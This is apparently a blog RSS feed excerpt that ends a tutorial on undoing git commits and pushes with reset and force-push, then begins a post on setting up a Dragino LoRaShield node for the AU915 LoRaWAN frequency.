&lt;h2 id=&quot;example-scenario&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#example-scenario&quot; aria-label=&quot;example scenario permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Example Scenario&lt;/h2&gt;
&lt;p&gt;The examples in this post use a simple git repository scenario. There is a git repository that contains four files: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;task1.py&lt;/code&gt; with the commit message: &lt;em&gt;First commit: task1.py&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;task2.py&lt;/code&gt; with the commit message: &lt;em&gt;Second commit: task2.py&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;task3.py&lt;/code&gt; with the commit message: &lt;em&gt;Third commit: task3.py&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;task4.py&lt;/code&gt; with the commit message: &lt;em&gt;Fourth commit: task4.py&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Using the &lt;code class=&quot;language-text&quot;&gt;git log&lt;/code&gt; command, we can see the following commit history:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;$ git log --oneline
6f81b42 (HEAD -&gt; master) Fourth commit: task4.py
385c1d1 Third commit: task3.py
25a73a4 Second commit: task2.py
b9fba9e First commit: task1.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The output from the &lt;code class=&quot;language-text&quot;&gt;git log&lt;/code&gt; command is a summary of what has been committed. Each line has the following details:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The commit object name (e.g., &lt;code class=&quot;language-text&quot;&gt;6f81b42&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;385c1d1&lt;/code&gt;). This value is actually 40 characters in length, however, the &lt;code class=&quot;language-text&quot;&gt;git log --oneline&lt;/code&gt; command only displays a partial prefix. We can still use this partial object name and do not require the complete name.&lt;/li&gt;
&lt;li&gt;The commit message (e.g., &lt;em&gt;Fourth commit: task4.py&lt;/em&gt; and &lt;em&gt;Third commit: task3.py&lt;/em&gt;)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Please note the list displayed by the &lt;code class=&quot;language-text&quot;&gt;git log&lt;/code&gt; command is from &lt;em&gt;most recent&lt;/em&gt; commit to the &lt;em&gt;oldest commit&lt;/em&gt;. &lt;/p&gt;
&lt;h2 id=&quot;undoing-the-last-commit&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#undoing-the-last-commit&quot; aria-label=&quot;undoing the last commit permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Undoing the Last Commit&lt;/h2&gt;
&lt;p&gt;We have not discussed this so far, but a git commit is greatly different from a git commit followed by a git push. If you have not &lt;em&gt;pushed&lt;/em&gt; the repository yet (say to GitHub) this is the method to use to undo the last commit you made. The basic command to undo the last commit is:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset HEAD~1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The above command is only relevant for undoing the most recent commit. This is very similar to pressing the &lt;em&gt;Undo&lt;/em&gt; button in Microsoft Word once. The option &lt;code class=&quot;language-text&quot;&gt;HEAD~1&lt;/code&gt; refers to the parent of the most recent commit. In the scenario example, we can see that the repository &lt;code class=&quot;language-text&quot;&gt;HEAD&lt;/code&gt; is the commit with the object name: &lt;code class=&quot;language-text&quot;&gt;6f81b42&lt;/code&gt; and the commit message: &lt;em&gt;Fourth commit: task4.py&lt;/em&gt;. Basically, &lt;code class=&quot;language-text&quot;&gt;HEAD~1&lt;/code&gt; moves the &lt;code class=&quot;language-text&quot;&gt;HEAD&lt;/code&gt; value up one, in this case to the third commit.&lt;/p&gt;
&lt;h4 id=&quot;undo-the-last-commit-and-do-not-remove-the-changes&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#undo-the-last-commit-and-do-not-remove-the-changes&quot; aria-label=&quot;undo the last commit and do not remove the changes permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Undo the last commit and do not remove the changes&lt;/h4&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset --soft HEAD~1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;--soft&lt;/code&gt; option does not remove the changes made. For example, when using &lt;code class=&quot;language-text&quot;&gt;--soft&lt;/code&gt;, the file &lt;code class=&quot;language-text&quot;&gt;task4.py&lt;/code&gt; is not removed from the disk (the file is not deleted), it is just removed from the &lt;em&gt;git index&lt;/em&gt;.&lt;/p&gt;
&lt;h4 id=&quot;undo-the-last-commit-and-remove-the-changes&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#undo-the-last-commit-and-remove-the-changes&quot; aria-label=&quot;undo the last commit and remove the changes permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Undo the last commit and remove the changes&lt;/h4&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset --hard HEAD~1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;--hard&lt;/code&gt; option removes the changes made. For example, when using &lt;code class=&quot;language-text&quot;&gt;--hard&lt;/code&gt;, the file &lt;code class=&quot;language-text&quot;&gt;task4.py&lt;/code&gt; is deleted from the disk (the file is deleted) and from the &lt;em&gt;git index&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&quot;undoing-a-specific-commit&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#undoing-a-specific-commit&quot; aria-label=&quot;undoing a specific commit permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Undoing a Specific Commit&lt;/h2&gt;
&lt;p&gt;In the last section, we covered how to undo, or remove, the last commit made. In this section, we discuss how to undo a specific commit. You can use a very similar syntax, however, you need to replace &lt;code class=&quot;language-text&quot;&gt;HEAD~1&lt;/code&gt; with a specific object name. The basic command to undo a specific commit is:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset &lt;commit-object-name&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset 385c1d1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As previously discussed, the method to retrieve the commit history and the &lt;em&gt;commit object name&lt;/em&gt; is to use the &lt;code class=&quot;language-text&quot;&gt;git log&lt;/code&gt; command. Specifically, the &lt;code class=&quot;language-text&quot;&gt;--oneline&lt;/code&gt; argument provides an excellent method to display all git commits is a simple and easy to navigate view, as illustrated in the code snippet below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;$ git log --oneline
6f81b42 (HEAD -&gt; master) Fourth commit: task4.py
385c1d1 Third commit: task3.py
25a73a4 Second commit: task2.py
b9fba9e First commit: task1.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The following examples rely on finding the specific &lt;em&gt;commit object name&lt;/em&gt; to use as input to the &lt;code class=&quot;language-text&quot;&gt;git reset&lt;/code&gt; command. However, &lt;code class=&quot;language-text&quot;&gt;git log&lt;/code&gt; is not the only method to determine this value. You can also see the full &lt;em&gt;commit object name&lt;/em&gt; in your GitHub repository on the web interface - but, in my opinion, this is a more complex method.&lt;/p&gt;
&lt;h4 id=&quot;undo-a-specific-commit-and-do-not-remove-the-changes&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#undo-a-specific-commit-and-do-not-remove-the-changes&quot; aria-label=&quot;undo a specific commit and do not remove the changes permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Undo a specific commit and do not remove the changes&lt;/h4&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset --soft &lt;commit-object-name&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset --soft 385c1d1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This command resets a git repository back to the specific commit object name of &lt;code class=&quot;language-text&quot;&gt;385c1d1&lt;/code&gt;. Similar to the example above, the &lt;code class=&quot;language-text&quot;&gt;--soft&lt;/code&gt; option does not remove the changes made. For example, when using &lt;code class=&quot;language-text&quot;&gt;--soft&lt;/code&gt;, the file &lt;code class=&quot;language-text&quot;&gt;task4.py&lt;/code&gt; is not removed from the disk (the file is not deleted), it is just removed from the &lt;em&gt;git index&lt;/em&gt;.&lt;/p&gt;
&lt;h4 id=&quot;undo-a-specific-commit-and-remove-the-changes&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#undo-a-specific-commit-and-remove-the-changes&quot; aria-label=&quot;undo a specific commit and remove the changes permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Undo a specific commit and remove the changes&lt;/h4&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset --hard &lt;commit-object-name&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git reset --hard 385c1d1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This command resets a git repository back to the specific commit object name of &lt;code class=&quot;language-text&quot;&gt;385c1d1&lt;/code&gt;. Similar to the example above, the &lt;code class=&quot;language-text&quot;&gt;--hard&lt;/code&gt; option removes the changes made. For example, when using &lt;code class=&quot;language-text&quot;&gt;--hard&lt;/code&gt;, the file &lt;code class=&quot;language-text&quot;&gt;task4.py&lt;/code&gt; is deleted from the disk (the file is deleted) and from the &lt;em&gt;git index&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&quot;how-to-undo-a-git-push&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-to-undo-a-git-push&quot; aria-label=&quot;how to undo a git push permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to Undo a Git Push&lt;/h2&gt;
&lt;p&gt;Once a &lt;code class=&quot;language-text&quot;&gt;git reset&lt;/code&gt; has been performed, it is relatively straightforward to undo a &lt;code class=&quot;language-text&quot;&gt;git push&lt;/code&gt;. Basically, GitHub will read the git index and display the information. Since we have already fixed (undone) the git index, we simply need to push the git repository again. This can be achieved using:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git push origin master --force&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;language-text&quot;&gt;--force&lt;/code&gt; argument will delete previous commits and push the current local git repository.&lt;/p&gt;
&lt;h3 id=&quot;words-of-caution&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#words-of-caution&quot; aria-label=&quot;words of caution permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Words of Caution&lt;/h3&gt;
&lt;p&gt;Please be aware that some of these techniques specified in this post to &lt;em&gt;undo git commits and pushes&lt;/em&gt; are bad practices for public git repositories… especially when working with multiple developers. Basically, it is bad practice to &lt;code class=&quot;language-text&quot;&gt;force&lt;/code&gt; a push on a public git repository, and you should use &lt;code class=&quot;language-text&quot;&gt;revert&lt;/code&gt; instead. Maybe I have been a solo developer for too long!&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Git is a difficult tool to master. Unfortunately, the best method to understand how it operates is to have a thorough understanding of how the staging, indexing, and the remote repository work in conjunction. A fellow work colleague gave me some great advice about learning git. I told her that I had read all these articles and watched videos about how to use git correctly. She said, &lt;em&gt;“why don’t you just create a throw-away repository, and actually try it”&lt;/em&gt;. It was amazing advice, and how I actually learned git.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Dragino LoRaShield Node Configuration for AU915 MHz]]></title><description><![CDATA[Update: This tutorial is now considered out-of-date. I have written a new tutorial which uses a more recent version of the Arduino-LMIC…]]></description><link>https://thomaslaurenson.com/blog/2018-07-06/dragino-lorashield-node-configuration-for-AU915/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-06/dragino-lorashield-node-configuration-for-AU915/</guid><pubDate>Fri, 06 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;Update: This tutorial is now considered out-of-date. I have written a new tutorial which uses a more recent version of the &lt;em&gt;Arduino-LMIC&lt;/em&gt; library&lt;/strong&gt; modified by MCCI which has much better support for the AU915 frequency. Please view the updated &lt;a href=&quot;/blog/2018-07-21/dragino-lorashield-on-AU915/&quot;&gt;Dragino LoRa Shield Node Configuration for AU915 (Updated)&lt;/a&gt; post for more information.&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#quick-start&quot;&gt;Quick Start&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#australian-and-new-zealand-frequencies&quot;&gt;Australian and New Zealand Frequencies&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#walkthrough&quot;&gt;Walkthrough&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#hardware-overview&quot;&gt;Hardware Overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#setup-arduino-ide&quot;&gt;Setup Arduino IDE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#download-repo-and-flash-arduino&quot;&gt;Download Repo and Flash Arduino&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#lorawan-library-configuration&quot;&gt;LoRaWAN Library Configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#lmic-fork&quot;&gt;LMIC Fork&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#arduino-sketch-for-dragino-lorashield&quot;&gt;Arduino sketch for Dragino LoRaShield&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#additional-resources&quot;&gt;Additional Resources&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;introduction&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#introduction&quot; aria-label=&quot;introduction permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
&lt;p&gt;The Dragino LoRaShield is a popular example of an easy to use development/prototype board for use in LoRaWAN networks. The Dragino LoRaShield is an Arduino shield that provides the ability to function as either a LoRaWAN node or a single channel LoRaWAN gateway. This documentation, and accompanying source code focus solely on creating a development LoRaWAN node. The specific purpose of this repository (and guide) is to provide an example of the Dragino LoRaShield device operating on the standardized LoRaWAN frequencies for Australia and New Zealand… specifically the 915 MHz to 930 MHz frequency, more commonly known as &lt;em&gt;AU915&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&quot;quick-start&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#quick-start&quot; aria-label=&quot;quick start permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Download the &lt;a href=&quot;https://github.com/thomaslaurenson/Dragino_LoRaShield_Node_AU915/blob/master/README.md&quot;&gt;Dragino&lt;em&gt;LoRaShield&lt;/em&gt;Node_AU915
&lt;/a&gt; as a zip file&lt;/li&gt;
&lt;li&gt;Add library to Arduino IDE using add a zip file functionality&lt;/li&gt;
&lt;li&gt;Plug in Arduino with a Dragino LoRaShield attached&lt;/li&gt;
&lt;li&gt;Optional: Edit source code &lt;code class=&quot;language-text&quot;&gt;Dragino_LoRaShield_AU915.ino&lt;/code&gt; file to send different output/add code for sensors etc.&lt;/li&gt;
&lt;li&gt;Select Upload to compile, then upload&lt;/li&gt;
&lt;li&gt;View device is functioning correctly by viewing serial output&lt;/li&gt;
&lt;li&gt;Done.&lt;/li&gt;
&lt;/ol&gt;
